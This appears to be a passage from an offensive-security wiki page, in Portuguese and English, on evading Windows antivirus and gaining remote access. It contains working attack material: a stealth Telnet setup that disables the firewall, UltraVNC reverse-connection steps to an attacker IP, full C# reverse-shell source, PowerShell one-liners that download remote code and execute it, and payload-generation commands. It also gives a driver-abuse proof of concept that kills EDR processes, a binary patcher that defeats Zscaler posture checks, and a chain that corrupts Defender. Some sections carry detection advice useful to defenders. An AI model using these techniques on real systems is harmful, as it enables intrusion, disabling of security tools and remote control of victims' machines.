Until Windows10, all Windows came with a **Telnet server** that you could install (as administrator) doing:
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
Faça com que ele **inicie** quando o sistema for iniciado e **execute-o** agora:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**Alterar a porta do telnet (stealth) e desativar o firewall:**
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

Faça o download em: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (você quer os downloads bin, não o setup)

**ON THE HOST**: Execute _**winvnc.exe**_ e configure o servidor:

- Habilite a opção _Disable TrayIcon_
- Defina uma senha em _VNC Password_
- Defina uma senha em _View-Only Password_

Em seguida, mova o binário _**winvnc.exe**_ e o arquivo **recém-criado** _**UltraVNC.ini**_ para dentro da **victim**

#### **Reverse connection**

O **attacker** deve **executar no** seu **host** o binário `vncviewer.exe -listen 5900` para ficar **preparado** para receber uma reverse **VNC connection**. Então, dentro da **victim**: inicie o daemon winvnc `winvnc.exe -run` e execute `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**WARNING:** Para manter o stealth você não deve fazer algumas coisas

- Não inicie `winvnc` se já estiver em execução ou você acionará um [popup](https://i.imgur.com/1SROTTl.png). Verifique se está em execução com `tasklist | findstr winvnc`
- Não inicie `winvnc` sem `UltraVNC.ini` no mesmo diretório ou isso fará com que [a janela de configuração](https://i.imgur.com/rfMQWcf.png) seja aberta
- Não execute `winvnc -h` para ajuda ou você acionará um [popup](https://i.imgur.com/oc18wcu.png)

### GreatSCT

Faça o download em: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
Dentro do GreatSCT:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
Agora **inicie o lister** com `msfconsole -r file.rc` e **execute** o **xml payload** com:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**O Defender atual encerrará o processo muito rápido.**

### Compiling our own reverse shell

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Primeiro C# Revershell

Compile-o com:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
Use-o com:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# usando o compilador
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Download e execução automáticos:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

Lista de ofuscadores para C#: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Usando python para criar injetores — exemplo:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Outras ferramentas
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### More

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – Eliminando AV/EDR a partir do espaço do kernel

Storm-2603 utilizou uma pequena utilidade de console conhecida como **Antivirus Terminator** para desabilitar proteções endpoint antes de dropar ransomware. A ferramenta traz o **próprio driver vulnerável mas *assinado*** e o abusa para emitir operações privilegiadas no kernel que até serviços AV em Protected-Process-Light (PPL) não conseguem bloquear.

Pontos principais
1. **Signed driver**: O arquivo entregue em disco é `ServiceMouse.sys`, mas o binário é o driver legitimamente assinado `AToolsKrnl64.sys` do “System In-Depth Analysis Toolkit” da Antiy Labs. Como o driver possui uma assinatura válida da Microsoft, ele é carregado mesmo quando o Driver-Signature-Enforcement (DSE) está habilitado.
2. **Service installation**:
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
A primeira linha registra o driver como um **serviço de kernel** e a segunda o inicia para que `\\.\ServiceMouse` se torne acessível a partir do espaço do usuário.
3. **IOCTLs exposed by the driver**
| IOCTL code | Capability                              |
|-----------:|-----------------------------------------|
| `0x99000050` | Terminar um processo arbitrário por PID (usado para encerrar serviços do Defender/EDR) |
| `0x990000D0` | Excluir um arquivo arbitrário no disco |
| `0x990001D0` | Descarregar o driver e remover o serviço |

Minimal C proof-of-concept:
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. **Why it works**:  BYOVD ignora totalmente as proteções em modo usuário; código que executa no kernel pode abrir *processos protegidos*, terminá-los ou manipular objetos do kernel independentemente de PPL/PP, ELAM ou outras medidas de hardening.

Detection / Mitigation
•  Habilitar a lista de bloqueio de drivers vulneráveis da Microsoft (`HVCI`, `Smart App Control`) para que o Windows se recuse a carregar `AToolsKrnl64.sys`.  
•  Monitorar criações de novos serviços de *kernel* e alertar quando um driver é carregado a partir de um diretório gravável por qualquer usuário ou não presente na lista de permitidos.  
•  Observar handles em modo usuário para objetos de dispositivo customizados seguidos por chamadas suspeitas de `DeviceIoControl`.

### Bypassing Zscaler Client Connector Posture Checks via On-Disk Binary Patching

O **Client Connector** da Zscaler aplica regras de postura do dispositivo localmente e depende de Windows RPC para comunicar os resultados a outros componentes. Duas escolhas de design fracas tornam um bypass completo possível:

1. A avaliação de postura acontece **inteiramente no cliente** (um booleano é enviado ao servidor).  
2. Endpoints RPC internos validam apenas que o executável que se conecta é **assinado pela Zscaler** (via `WinVerifyTrust`).

Ao **patchar quatro binários assinados no disco** ambos os mecanismos podem ser neutralizados:

| Binary | Original logic patched | Result |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Sempre retorna `1`, portanto toda verificação é considerada em conformidade |
| `ZSAService.exe` | Chamada indireta para `WinVerifyTrust` | Substituído por NOP ⇒ qualquer processo (mesmo não assinado) pode vincular-se aos pipes RPC |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Substituído por `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Verificações de integridade no túnel | Contornado |

Minimal patcher excerpt:
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
Depois de substituir os arquivos originais e reiniciar a pilha de serviços:

* **Todos** as verificações de postura exibem **verde/compatível**.
* Binários não assinados ou modificados podem abrir os endpoints RPC via named-pipe (ex.: `\\RPC Control\\ZSATrayManager_talk_to_me`).
* O host comprometido ganha acesso irrestrito à rede interna definida pelas políticas do Zscaler.

Este estudo de caso demonstra como decisões de confiança puramente do lado do cliente e simples verificações de assinatura podem ser derrotadas com algumas alterações de bytes.

## Abusando de Protected Process Light (PPL) para manipular AV/EDR com LOLBINs

Protected Process Light (PPL) impõe uma hierarquia de assinantes/níveis para que apenas processos protegidos de nível igual ou superior possam manipular uns aos outros. No ataque, se você conseguir iniciar legitimamente um binário habilitado para PPL e controlar seus argumentos, é possível converter funcionalidades benignas (por exemplo, logging) em uma primitiva de escrita restrita, suportada por PPL, contra diretórios protegidos usados por AV/EDR.

O que faz um processo rodar como PPL
- O EXE alvo (e quaisquer DLLs carregadas) deve ser assinado com um EKU compatível com PPL.
- O processo precisa ser criado com CreateProcess usando as flags: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- Deve ser requisitado um nível de proteção compatível que corresponda ao assinante do binário (por exemplo, `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` para assinantes anti-malware, `PROTECTION_LEVEL_WINDOWS` para assinantes do Windows). Níveis incorretos falharão na criação.

Veja também uma introdução mais ampla a PP/PPL e proteção do LSASS aqui:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Ferramentas de launcher
- Auxiliar open-source: CreateProcessAsPPL (seleciona o nível de proteção e encaminha os argumentos para o EXE alvo):
- [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- Padrão de uso:
```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```
Primitiva LOLBIN: ClipUp.exe
- The signed system binary `C:\Windows\System32\ClipUp.exe` self-spawns and accepts a parameter to write a log file to a caller-specified path.
- When launched as a PPL process, the file write occurs with PPL backing.
- ClipUp cannot parse paths containing spaces; use 8.3 short paths to point into normally protected locations.

8.3 short path helpers
- List short names: `dir /x` in each parent directory.
- Derive short path in cmd: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Abuse chain (abstract)
1) Launch the PPL-capable LOLBIN (ClipUp) with `CREATE_PROTECTED_PROCESS` using a launcher (e.g., CreateProcessAsPPL).
2) Pass the ClipUp log-path argument to force a file creation in a protected AV directory (e.g., Defender Platform). Use 8.3 short names if needed.
3) If the target binary is normally open/locked by the AV while running (e.g., MsMpEng.exe), schedule the write at boot before the AV starts by installing an auto-start service that reliably runs earlier. Validate boot ordering with Process Monitor (boot logging).
4) On reboot the PPL-backed write happens before the AV locks its binaries, corrupting the target file and preventing startup.

Example invocation (paths redacted/shortened for safety):
```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```
Notas e restrições
- Você não pode controlar o conteúdo que ClipUp escreve além do local; a primitiva é mais adequada à corrupção do que à injeção precisa de conteúdo.
- Requer admin local/SYSTEM para instalar/iniciar um serviço e uma janela de reboot.
- O timing é crítico: o alvo não deve estar aberto; a execução no boot evita locks de arquivo.

Detecções
- Criação do processo de `ClipUp.exe` com argumentos incomuns, especialmente com processo pai não padrão, em torno do boot.
- Novos serviços configurados para auto-iniciar binários suspeitos e que consistentemente iniciam antes do Defender/AV. Investigue criação/modificação de serviços antes de falhas de inicialização do Defender.
- Monitoramento de integridade de arquivos em binários do Defender/diretórios Platform; criações/modificações de arquivos inesperadas por processos com flags de protected-process.
- Telemetria ETW/EDR: procure por processos criados com `CREATE_PROTECTED_PROCESS` e uso anômalo de níveis PPL por binários não-AV.

Mitigações
- WDAC/Code Integrity: restrinja quais binários assinados podem rodar como PPL e sob quais pais; bloqueie invocações de ClipUp fora de contextos legítimos.
- Higiene de serviços: restrinja criação/modificação de serviços de auto-início e monitore manipulação da ordem de inicialização.
- Garanta que tamper protection do Defender e proteções de early-launch estejam habilitadas; investigue erros de inicialização que indiquem corrupção de binários.
- Considere desativar a geração de nomes curtos 8.3 em volumes que hospedam ferramentas de segurança se compatível com seu ambiente (teste cuidadosamente).

References for PPL and tooling
- Microsoft Protected Processes overview: https://learn.microsoft.com/windows/win32/procthread/protected-processes
- EKU reference: https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88
- Procmon boot logging (ordering validation): https://learn.microsoft.com/sysinternals/downloads/procmon
- CreateProcessAsPPL launcher: https://github.com/2x7EQ13/CreateProcessAsPPL
- Technique writeup (ClipUp + PPL + boot-order tamper): https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html

## Referências

- [Unit42 – New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [Hexacorn – DLL ForwardSideLoading: Abusing Forwarded Exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [Windows 11 Forwarded Exports Inventory (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [Microsoft Docs – Known DLLs](https://learn.microsoft.com/windows/win32/dlls/known-dlls)
- [Microsoft – Protected Processes](https://learn.microsoft.com/windows/win32/procthread/protected-processes)
- [Microsoft – EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [Zero Salarium – Countering EDRs With The Backing Of Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)

{{#include ../banners/hacktricks-training.md}}
